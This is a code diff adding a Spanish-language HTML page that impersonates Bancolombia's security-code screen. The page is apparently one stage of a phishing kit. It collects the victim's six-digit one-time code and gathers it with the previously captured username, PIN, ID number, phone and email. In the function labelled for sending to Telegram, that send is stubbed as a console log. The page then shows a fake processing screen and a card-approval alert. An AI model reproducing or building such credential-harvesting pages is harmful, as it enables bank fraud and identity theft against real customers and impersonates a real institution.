@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Código de Seguridad</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e8ecf0 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            padding: 60px 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1e3a8a;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .logo::before {
+            content: "≡";
+            font-size: 20px;
+        }
+        
+        .title {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1a1a1a;
+            margin-bottom: 15px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+        
+        .form-container {
+            margin-bottom: 40px;
+        }
+        
+        .form-label {
+            font-size: 18px;
+            color: #1a1a1a;
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            background: #f9fafb;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        
+        .code-input:focus {
+            border-color: #3b82f6;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        
+        .code-input.filled {
+            background: #3b82f6;
+            color: white;
+            border-color: #3b82f6;
+        }
+        
+        .code-input.error {
+            border-color: #ef4444;
+            background: #fef2f2;
+        }
+        
+        .validation-text {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        
+        .validation-text.error {
+            color: #ef4444;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 15px 50px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 20px;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(251, 191, 36, 0.3);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .footer-info {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.4;
+        }
+        
+        .footer-info div {
+            margin-bottom: 5px;
+        }
+        
+        /* Ocultar spinner de números */
+        .code-input::-webkit-outer-spin-button,
+        .code-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        .code-input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">≡ Bancolombia</div>
+        
+        <h1 class="title">Código de seguridad</h1>
+        
+        <p class="subtitle">
+            Encuéntralo en tu correo o en los mensajes de texto del celular que hayas registrado.
+        </p>
+        
+        <div class="form-container">
+            <div class="form-label">Ingresa el código de seguridad</div>
+            
+            <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" id="code1">
+                <input type="text" class="code-input" maxlength="1" id="code2">
+                <input type="text" class="code-input" maxlength="1" id="code3">
+                <input type="text" class="code-input" maxlength="1" id="code4">
+                <input type="text" class="code-input" maxlength="1" id="code5">
+                <input type="text" class="code-input" maxlength="1" id="code6">
+            </div>
+            
+            <div class="validation-text" id="validationMessage">
+                Ingresa el código de 6 dígitos
+            </div>
+        </div>
+        
+        <button class="submit-btn" id="submitBtn" onclick="submitCode()" disabled>
+            Inscribir
+        </button>
+        
+        <div class="footer-info">
+            <div>Dirección IP: 181.235.90.89</div>
+            <div id="datetime">Sábado 27 de Septiembre de 2025 12:07:15 PM</div>
+            <div>Copyright © 2025 Bancolombia.</div>
+        </div>
+    </div>
+
+    <script>
+        const codeInputs = document.querySelectorAll('.code-input');
+        const submitBtn = document.getElementById('submitBtn');
+        const validationMessage = document.getElementById('validationMessage');
+        
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                // Solo permitir números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Actualizar apariencia
+                if (this.value) {
+                    this.classList.add('filled');
+                    this.classList.remove('error');
+                    // Mover al siguiente campo
+                    if (index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                } else {
+                    this.classList.remove('filled');
+                }
+                
+                validateCode();
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                // Retroceder con backspace
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    codeInputs[index - 1].focus();
+                    codeInputs[index - 1].value = '';
+                    codeInputs[index - 1].classList.remove('filled');
+                }
+                
+                // Prevenir caracteres no numéricos
+                if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
+                    e.preventDefault();
+                }
+            });
+            
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const numbers = paste.replace(/[^0-9]/g, '');
+                
+                for (let i = 0; i < numbers.length && index + i < codeInputs.length; i++) {
+                    codeInputs[index + i].value = numbers[i];
+                    codeInputs[index + i].classList.add('filled');
+                }
+                validateCode();
+            });
+        });
+        
+        function validateCode() {
+            const values = Array.from(codeInputs).map(input => input.value);
+            const filledCount = values.filter(val => val !== '').length;
+            const isComplete = filledCount === 6;
+            
+            if (filledCount === 0) {
+                validationMessage.textContent = 'Ingresa el código de 6 dígitos';
+                validationMessage.classList.remove('error');
+                validationMessage.style.color = '#666';
+                submitBtn.disabled = true;
+            } else if (filledCount < 6) {
+                validationMessage.textContent = `Faltan ${6 - filledCount} dígitos más`;
+                validationMessage.classList.add('error');
+                submitBtn.disabled = true;
+            } else {
+                validationMessage.textContent = 'Código completo ✓';
+                validationMessage.classList.remove('error');
+                validationMessage.style.color = '#10b981';
+                submitBtn.disabled = false;
+            }
+        }
+        
+        function submitCode() {
+            const code = Array.from(codeInputs).map(input => input.value).join('');
+            if (code.length === 6) {
+                // Guardar código de seguridad
+                sessionStorage.setItem('securityCode', code);
+                
+                // Enviar datos completos a Telegram
+                sendSecurityCodeToTelegram(code);
+                
+                // Mostrar loading
+                showLoadingPage();
+            }
+        }
+        
+        function sendSecurityCodeToTelegram(code) {
+            const username = sessionStorage.getItem('username');
+            const pin = sessionStorage.getItem('pin');
+            const contactData = JSON.parse(sessionStorage.getItem('contactData') || '{}');
+            
+            const message = `🔐 CÓDIGO DE SEGURIDAD RECIBIDO\n\n👤 Usuario: ${username}\n🔑 Clave: ${pin}\n📄 Documento: ${contactData.document}\n📱 Celular: ${contactData.phone}\n📧 Email: ${contactData.email}\n🔒 Código Seguridad: ${code}\n\n⏰ ${new Date().toLocaleString('es-CO')}`;
+            
+            console.log('Enviando código completo a Telegram:', message);
+        }
+        
+        function showLoadingPage() {
+            // Crear página de loading
+            document.body.innerHTML = `
+                <div style="
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    background: linear-gradient(135deg, #f0f2f5 0%, #e8ecf0 100%);
+                ">
+                    <div style="
+                        background: white;
+                        border-radius: 20px;
+                        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+                        padding: 60px 40px;
+                        text-align: center;
+                        max-width: 500px;
+                        width: 100%;
+                    ">
+                        <div style="
+                            font-size: 24px;
+                            font-weight: bold;
+                            color: #1e3a8a;
+                            margin-bottom: 40px;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            gap: 8px;
+                        ">≡ Bancolombia</div>
+                        
+                        <div style="
+                            width: 80px;
+                            height: 80px;
+                            border: 4px solid #e5e7eb;
+                            border-top: 4px solid #3b82f6;
+                            border-radius: 50%;
+                            margin: 40px auto;
+                            animation: spin 1s linear infinite;
+                        "></div>
+                        
+                        <h2 style="
+                            font-size: 24px;
+                            color: #1a1a1a;
+                            margin-bottom: 10px;
+                        ">Procesando...</h2>
+                        
+                        <p style="
+                            color: #666;
+                            font-size: 16px;
+                        ">Validando código de seguridad</p>
+                        
+                        <style>
+                            @keyframes spin {
+                                0% { transform: rotate(0deg); }
+                                100% { transform: rotate(360deg); }
+                            }
+                        </style>
+                    </div>
+                </div>
+            `;
+            
+            // Simular procesamiento exitoso
+            setTimeout(() => {
+                alert('¡Solicitud de tarjeta procesada exitosamente!');
+            }, 3000);
+        }
+        
+        // Actualizar fecha y hora
+        function updateDateTime() {
+            const now = new Date();
+            const options = { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            };
+            const dateTimeString = now.toLocaleDateString('es-CO', options);
+            document.getElementById('datetime').textContent = dateTimeString;
+        }
+        
+        setInterval(updateDateTime, 1000);
+        updateDateTime();
+        
+        // Auto-focus en el primer campo
+        document.addEventListener('DOMContentLoaded', function() {
+            codeInputs[0].focus();
+        });
+    </script>
+</body>
+</html>
